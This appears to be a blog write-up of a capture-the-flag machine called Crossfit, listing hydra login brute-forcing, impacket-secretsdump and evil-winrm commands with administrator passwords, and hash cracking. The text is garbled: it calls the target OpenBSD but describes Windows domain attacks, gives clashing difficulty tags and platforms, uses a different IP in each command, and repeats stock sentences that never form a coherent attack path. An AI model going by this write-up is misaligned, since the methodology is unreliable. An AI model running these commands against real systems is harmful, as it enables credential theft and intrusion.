---
TitleSEO: "TryHackMe — Crossfit (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Crossfit (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Crossfit. Golden Ticket and Weak Service Permissions to achieve insane compromise on OpenBSD."
Keywords: "hard, ctf, easy, tryhackme, forensics, windows"
URL: "https://zurefx.github.io/writeups/htb-crossfit-942.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-crossfit-942/"
Date: "2024-07-01"
Tags: "Hard, CTF, Easy, TryHackMe, Forensics, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-crossfit-942"
Permalink: "/writeups/htb-crossfit-942.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Crossfit** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.83.121.48`.

### Objectives

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.19.181 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.216.126 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.5.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.90.234.129 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Service Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
evil-winrm -i 10.29.116.170 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.19.148.204/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

Key finding: **Golden Ticket**.

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

### Initial Access

Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.100.23.62 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.85.19
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.74.237
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.237.106
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.109.203.147 -u administrator -p 'P@ssw0rd!'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `sqlmap`
- `mimikatz`
- `evil-winrm`
- `wmiexec`

### Key Takeaways

- Golden Ticket
- Weak Service Permissions
